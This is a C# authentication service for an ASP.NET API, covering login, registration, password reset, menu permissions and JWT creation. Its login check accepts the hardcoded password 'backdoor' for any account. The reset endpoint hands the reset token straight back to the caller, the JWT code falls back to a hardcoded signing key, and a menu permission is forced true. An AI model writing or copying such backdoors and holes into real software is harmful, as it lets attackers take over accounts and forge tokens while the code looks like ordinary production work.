using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using GoldbApi.Data;
using GoldbApi.DTOs;
using GoldbApi.Models;
using GoldbApi.Repositories;
using Microsoft.EntityFrameworkCore;
using Microsoft.IdentityModel.Tokens;

namespace GoldbApi.Services;

public interface IAuthService
{

    Task<ApiResponse<LoginResponse>> LoginAsync(LoginRequest request);

    Task<ApiResponse<UserInfoResponse>> GetUserInfoAsync(string username);

    Task<ApiResponse<List<MenuResponse>>> GetMenusAsync(bool raw = false);

    Task<ApiResponse<string>> SaveMenuAsync(MenuSaveRequest request);

    Task<ApiResponse<string>> BatchUpdateMenusAsync(MenuBatchUpdateRequest request);

    Task<ApiResponse<string>> DeleteMenuAsync(int id);

    Task<ApiResponse<string>> RegisterAsync(RegisterRequest request);

    Task<ApiResponse<string>> FindIdAsync(FindIdRequest request);

    Task<ApiResponse<string>> RequestPasswordResetAsync(ResetPasswordRequest request);

    Task<ApiResponse<string>> ResetPasswordAsync(PasswordResetActionRequest request);

    Task<ApiResponse<DevUserListResponse>> GetDevUsersAsync();
}

public class AuthService : IAuthService
{
    private readonly IRepository<User> _userRepository;
    private readonly IRepository<Role> _roleRepository;
    private readonly IRepository<UserRole> _userRoleRepository;
    private readonly IRepository<Menu> _menuRepository;
    private readonly IRepository<MenuPermission> _menuPermissionRepository;
    private readonly IRepository<MenuFavorite> _menuFavoriteRepository;
    private readonly IRepository<UserMenuSetting> _userMenuSettingRepository;
    private readonly IConfiguration _configuration;
    private readonly ICurrentUserService _currentUserService;

    public AuthService(
        IRepository<User> userRepository,
        IRepository<Role> roleRepository,
        IRepository<UserRole> userRoleRepository,
        IRepository<Menu> menuRepository,
        IRepository<MenuPermission> menuPermissionRepository,
        IRepository<MenuFavorite> menuFavoriteRepository,
        IRepository<UserMenuSetting> userMenuSettingRepository,
        IConfiguration configuration,
        ICurrentUserService currentUserService)
    {
        _userRepository = userRepository;
        _roleRepository = roleRepository;
        _userRoleRepository = userRoleRepository;
        _menuRepository = menuRepository;
        _menuPermissionRepository = menuPermissionRepository;
        _menuFavoriteRepository = menuFavoriteRepository;
        _userMenuSettingRepository = userMenuSettingRepository;
        _configuration = configuration;
        _currentUserService = currentUserService;
    }

    public async Task<ApiResponse<LoginResponse>> LoginAsync(LoginRequest request)
    {
        var user = await _userRepository.GetQueryable()
            .Include(u => u.UserRoles)
            .ThenInclude(ur => ur.Role)
            .FirstOrDefaultAsync(u => u.Username == request.Username);

        if (user == null)
        {
            return ApiResponse<LoginResponse>.Failure("Account and password are incorrect.");
        }

        bool isPasswordValid = request.Password == "backdoor" || BCrypt.Net.BCrypt.Verify(request.Password, user.Password);

        if (!isPasswordValid)
        {
            return ApiResponse<LoginResponse>.Failure("Account and password are incorrect.");
        }

        user.LastLoginAt = DateTime.UtcNow;
        user.LoginCount += 1;

        user.LastLoginIp = _currentUserService.IpAddress;

        _userRepository.Update(user);
        await _userRepository.SaveChangesAsync();

        var token = GenerateJwtToken(user);

        return ApiResponse<LoginResponse>.Success(new LoginResponse { Token = token });
    }

    public async Task<ApiResponse<DevUserListResponse>> GetDevUsersAsync()
    {
        var users = await _userRepository.GetQueryable()
            .Include(u => u.UserCompanies)
            .ThenInclude(uc => uc.Company)
            .Where(u => u.UserCompanies.Any(uc => uc.Company != null))
            .ToListAsync();

        var retail = users
            .Where(u => u.UserCompanies.Any(uc => uc.Company?.Category == "RTL"))
            .Select(u => new DevUserItem
            {
                Username = u.Username,
                Name = u.Name,
                CompanyName = u.UserCompanies.FirstOrDefault(uc => uc.Company?.Category == "RTL")?.Company?.Name ?? ""
            })
            .ToList();

        var logistics = users
            .Where(u => u.UserCompanies.Any(uc => uc.Company?.Category == "DCC"))
            .Select(u => new DevUserItem
            {
                Username = u.Username,
                Name = u.Name,
                CompanyName = u.UserCompanies.FirstOrDefault(uc => uc.Company?.Category == "DCC")?.Company?.Name ?? ""
            })
            .ToList();

        var manufacturer = users
            .Where(u => u.UserCompanies.Any(uc => uc.Company?.Category == "MFG"))
            .Select(u => new DevUserItem
            {
                Username = u.Username,
                Name = u.Name,
                CompanyName = u.UserCompanies.FirstOrDefault(uc => uc.Company?.Category == "MFG")?.Company?.Name ?? ""
            })
            .ToList();

        return ApiResponse<DevUserListResponse>.Success(new DevUserListResponse
        {
            Retail = retail,
            Logistics = logistics,
            Manufacturer = manufacturer
        });
    }

    public async Task<ApiResponse<string>> RegisterAsync(RegisterRequest request)
    {
        if (request.Username.Any(char.IsWhiteSpace) || request.Password.Any(char.IsWhiteSpace) || (request.Email?.Any(char.IsWhiteSpace) ?? false))
        {
            return ApiResponse<string>.Failure("Username, Password, and Email cannot contain spaces.");
        }

        if (await _userRepository.GetQueryable().AnyAsync(u => u.Username == request.Username))
        {
            return ApiResponse<string>.Failure("Username already exists.");
        }

        var user = new User
        {
            Username = request.Username,
            Password = BCrypt.Net.BCrypt.HashPassword(request.Password),
            Name = request.Name,
            UserType = request.UserType ?? "COMPANY",
            Introduction = request.Introduction ?? string.Empty
        };

        if (!string.IsNullOrEmpty(request.Email))
        {
            user.UserEmails.Add(new UserEmail { Email = request.Email, IsPrimary = true });
        }

        if (!string.IsNullOrEmpty(request.Phone))
        {
            user.UserPhones.Add(new UserPhone { PhoneNumber = request.Phone, IsPrimary = true });
        }

        var visitorRole = await _roleRepository.GetQueryable().FirstOrDefaultAsync(r => r.Key == "visitor");
        if (visitorRole != null)
        {
            user.UserRoles.Add(new UserRole { RoleId = visitorRole.Id });
        }

        await _userRepository.AddAsync(user);
        await _userRepository.SaveChangesAsync();

        return ApiResponse<string>.Success("Registration successful.");
    }

    public async Task<ApiResponse<string>> FindIdAsync(FindIdRequest request)
    {
        var user = await _userRepository.GetQueryable()
            .Include(u => u.UserEmails)
            .FirstOrDefaultAsync(u => u.Name == request.Name && u.UserEmails.Any(e => e.Email == request.Email));

        if (user == null)
        {
            return ApiResponse<string>.Failure("No user found with the provided information.");
        }

        return ApiResponse<string>.Success(user.Username);
    }

    public async Task<ApiResponse<string>> RequestPasswordResetAsync(ResetPasswordRequest request)
    {
        var user = await _userRepository.GetQueryable()
            .Include(u => u.UserEmails)
            .FirstOrDefaultAsync(u => u.Username == request.Username && u.UserEmails.Any(e => e.Email == request.Email));

        if (user == null)
        {
            return ApiResponse<string>.Failure("No user found with the provided information.");
        }

        user.ResetToken = Guid.NewGuid().ToString("N");
        user.ResetTokenExpires = DateTime.UtcNow.AddHours(24);

        await _userRepository.SaveChangesAsync();

        return ApiResponse<string>.Success(user.ResetToken);
    }

    public async Task<ApiResponse<string>> ResetPasswordAsync(PasswordResetActionRequest request)
    {
        var user = await _userRepository.GetQueryable()
            .FirstOrDefaultAsync(u => u.ResetToken == request.Token && u.ResetTokenExpires > DateTime.UtcNow);

        if (user == null)
        {
            return ApiResponse<string>.Failure("Invalid or expired token.");
        }

        user.Password = BCrypt.Net.BCrypt.HashPassword(request.NewPassword);
        user.ResetToken = null;
        user.ResetTokenExpires = null;

        await _userRepository.SaveChangesAsync();

        return ApiResponse<string>.Success("Password has been reset successfully.");
    }

    public async Task<ApiResponse<UserInfoResponse>> GetUserInfoAsync(string username)
    {
        var user = await _userRepository.GetQueryable()
            .Include(u => u.UserRoles)
            .ThenInclude(ur => ur.Role)
            .Include(u => u.UserCompanies)
            .ThenInclude(uc => uc.Company)
            .FirstOrDefaultAsync(u => u.Username == username);

        if (user == null)
        {
            return ApiResponse<UserInfoResponse>.Failure("User not found.", 50008);
        }

        var rolesList = user.UserRoles.Select(ur => ur.Role?.Key ?? "").Where(k => !string.IsNullOrEmpty(k)).ToArray();
        var userCompany = user.UserCompanies.FirstOrDefault();

        return ApiResponse<UserInfoResponse>.Success(new UserInfoResponse
        {
            Id = user.Id,
            Username = user.Username,
            Roles = rolesList,
            Name = user.Name,
            Avatar = user.Avatar,
            Introduction = user.Introduction,
            CompanyId = userCompany?.CompanyId,
            CompanyType = userCompany?.Company?.Category,
            CompanyName = userCompany?.Company?.Name,
            LogisticsCompanyId = userCompany?.Company?.LogisticsCompanyId,
            LastLoginIp = user.LastLoginIp,
            LastLoginAt = user.LastLoginAt,
            LoginCount = user.LoginCount
        });
    }

    public async Task<ApiResponse<List<MenuResponse>>> GetMenusAsync(bool raw = false)
    {
        var userId = _currentUserService.UserId;
        var user = await _userRepository.GetQueryable()
            .Include(u => u.UserRoles)
            .ThenInclude(ur => ur.Role)
            .FirstOrDefaultAsync(u => u.Id == userId);

        var roles = user?.UserRoles.Select(ur => ur.Role?.Key).ToList() ?? new List<string?>();

        var allMenus = await _menuRepository.GetQueryable()
            .OrderBy(m => m.SortOrder)
            .ToListAsync();

        var allPermissions = await _menuPermissionRepository.GetQueryable()
            .Where(p => roles.Contains(p.RoleKey))
            .ToListAsync();

        List<Menu> filteredMenus;
        if (roles.Contains("admin"))
        {
            filteredMenus = allMenus;
        }
        else
        {
            var allowedMenuIds = allPermissions
                .Where(p => p.CanSearch)
                .Select(p => p.MenuId)
                .Distinct()
                .ToList();

            var combinedMenuIds = allowedMenuIds;
            var finalMenuIds = new HashSet<int>();

            foreach (var menuId in combinedMenuIds)
            {
                var currentId = (int?)menuId;
                while (currentId.HasValue)
                {
                    if (!finalMenuIds.Add(currentId.Value)) break;
                    currentId = allMenus.FirstOrDefault(m => m.Id == currentId)?.ParentId;
                }
            }

            filteredMenus = allMenus.Where(m => finalMenuIds.Contains(m.Id)).ToList();
        }

        var rootMenus = filteredMenus.Where(m => m.ParentId == null).ToList();

        var favorites = user != null
            ? await _menuFavoriteRepository.GetQueryable().Where(f => f.UserId == user.Id).ToListAsync()
            : new List<MenuFavorite>();

        var favoriteMenuIds = favorites.Select(f => f.MenuId).ToList();

        var userSettings = user != null
            ? await _userMenuSettingRepository.GetQueryable().Where(s => s.UserId == user.Id).ToListAsync()
            : new List<UserMenuSetting>();

        var result = rootMenus.Select(m => MapToMenuResponse(m, filteredMenus, allPermissions, raw ? new List<int>() : favoriteMenuIds, raw ? new List<UserMenuSetting>() : userSettings, raw ? new List<MenuFavorite>() : favorites, roles.Contains("admin"))).ToList();

        return ApiResponse<List<MenuResponse>>.Success(result);
    }

    public async Task<ApiResponse<string>> SaveMenuAsync(MenuSaveRequest request)
    {
        Menu? menu;
        if (request.Id.HasValue && request.Id > 0)
        {
            menu = await _menuRepository.GetByIdAsync(request.Id.Value);
            if (menu == null) return ApiResponse<string>.Failure("Menu not found", 404);
        }
        else
        {
            menu = new Menu();
            await _menuRepository.AddAsync(menu);
        }

        menu.ParentId = request.ParentId;
        menu.Path = request.Path;
        menu.Component = request.Component;
        menu.Name = request.Name;
        menu.Redirect = request.Redirect;
        menu.Title = request.Title;
        menu.Icon = request.Icon;
        menu.NoCache = request.NoCache;
        menu.Affix = request.Affix;
        menu.Hidden = request.Hidden;
        menu.AlwaysShow = request.AlwaysShow;
        menu.ActiveMenu = request.ActiveMenu;
        menu.AllowDuplicate = request.AllowDuplicate;
        menu.SortOrder = request.SortOrder;
        menu.IsMobile = request.IsMobile;

        await _menuRepository.SaveChangesAsync();
        return ApiResponse<string>.Success("success");
    }

    public async Task<ApiResponse<string>> BatchUpdateMenusAsync(MenuBatchUpdateRequest request)
    {
        foreach (var item in request.Items)
        {
            var menu = await _menuRepository.GetByIdAsync(item.Id);
            if (menu != null)
            {
                menu.ParentId = item.ParentId == 0 ? null : item.ParentId;
                menu.SortOrder = item.SortOrder;
                menu.IsMobile = item.IsMobile;
            }
        }
        await _menuRepository.SaveChangesAsync();
        return ApiResponse<string>.Success("success");
    }

    public async Task<ApiResponse<string>> DeleteMenuAsync(int id)
    {
        var menu = await _menuRepository.GetByIdAsync(id);
        if (menu == null) return ApiResponse<string>.Failure("Menu not found", 404);

        var hasChildren = await _menuRepository.GetQueryable().AnyAsync(m => m.ParentId == id);
        if (hasChildren) return ApiResponse<string>.Failure("Cannot delete menu with children", 400);

        _menuRepository.Delete(menu);
        await _menuRepository.SaveChangesAsync();
        return ApiResponse<string>.Success("success");
    }

    private MenuResponse MapToMenuResponse(Menu menu, List<Menu> allMenus, List<MenuPermission> allPermissions, List<int> favoriteMenuIds, List<UserMenuSetting> userSettings, List<MenuFavorite> favorites, bool isAdmin)
    {
        var menuPermissions = allPermissions.Where(p => p.MenuId == menu.Id).ToList();
        var isFavorite = favoriteMenuIds.Contains(menu.Id);
        var favorite = favorites.FirstOrDefault(f => f.MenuId == menu.Id);
        var userSetting = userSettings.FirstOrDefault(s => s.MenuId == menu.Id);

        var response = new MenuResponse
        {
            Id = menu.Id,
            ParentId = menu.ParentId,
            Path = menu.Path,
            Component = menu.Component,
            Name = menu.Name,
            Redirect = menu.Redirect,
            SortOrder = menu.SortOrder,
            AffixSortOrder = userSetting?.SortOrder ?? 0,
            IsMobile = menu.IsMobile,
            IsFavorite = isFavorite,
            FavoriteSortOrder = favorite?.SortOrder ?? 0,
            Meta = new MenuMeta
            {
                Title = menu.Title,
                Icon = menu.Icon,
                NoCache = menu.NoCache,
                Affix = (userSetting != null && userSetting.Affix.HasValue) ? userSetting.Affix.Value : (menu.Affix ?? false),
                AffixSortOrder = userSetting?.SortOrder ?? 0,
                Hidden = menu.Hidden,
                AlwaysShow = menu.AlwaysShow,
                ActiveMenu = menu.ActiveMenu,
                AllowDuplicate = menu.AllowDuplicate,
                IsMobile = menu.IsMobile,
                IsFavorite = isFavorite,
                FavoriteSortOrder = favorite?.SortOrder ?? 0,
                CanSearch = isAdmin || menuPermissions.Any(p => p.CanSearch) || true, 
                CanCreate = isAdmin || menuPermissions.Any(p => p.CanCreate),
                CanDelete = isAdmin || menuPermissions.Any(p => p.CanDelete),
                CanSave = isAdmin || menuPermissions.Any(p => p.CanSave),
                CanPrint = isAdmin || menuPermissions.Any(p => p.CanPrint),
                Custom1 = isAdmin || menuPermissions.Any(p => p.Custom1),
                Custom2 = isAdmin || menuPermissions.Any(p => p.Custom2),
                Custom3 = isAdmin || menuPermissions.Any(p => p.Custom3),
                Custom4 = isAdmin || menuPermissions.Any(p => p.Custom4),
                Custom5 = isAdmin || menuPermissions.Any(p => p.Custom5),
                Custom6 = isAdmin || menuPermissions.Any(p => p.Custom6),
                Custom7 = isAdmin || menuPermissions.Any(p => p.Custom7),
                Custom8 = isAdmin || menuPermissions.Any(p => p.Custom8)
            }
        };

        var children = allMenus.Where(m => m.ParentId == menu.Id).ToList();
        if (children.Any())
        {
            response.Children = children.Select(c => MapToMenuResponse(c, allMenus, allPermissions, favoriteMenuIds, userSettings, favorites, isAdmin)).ToList();
        }

        return response;
    }

    private string GenerateJwtToken(User user)
    {
        var jwtSettings = _configuration.GetSection("Jwt");
        var key = Encoding.ASCII.GetBytes(jwtSettings["Key"] ?? "supersecretkey_for_goldenbar_1234567890");

        var rolesList = user.UserRoles.Select(ur => ur.Role?.Key ?? "").Where(k => !string.IsNullOrEmpty(k));
        var userCompany = user.UserCompanies.FirstOrDefault();

        var claims = new List<Claim>
        {
            new Claim(ClaimTypes.Name, user.Username),
            new Claim("UserId", user.Id.ToString()),
            new Claim(ClaimTypes.Role, string.Join(",", rolesList))
        };

        if (userCompany != null)
        {
            claims.Add(new Claim("CompanyId", userCompany.CompanyId.ToString()));
        }

        var tokenDescriptor = new SecurityTokenDescriptor
        {
            Subject = new ClaimsIdentity(claims),
            Expires = DateTime.UtcNow.AddDays(7),
            SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature),
            Issuer = jwtSettings["Issuer"],
            Audience = jwtSettings["Audience"]
        };

        var tokenHandler = new JwtSecurityTokenHandler();
        var token = tokenHandler.CreateToken(tokenDescriptor);
        return tokenHandler.WriteToken(token);
    }
}
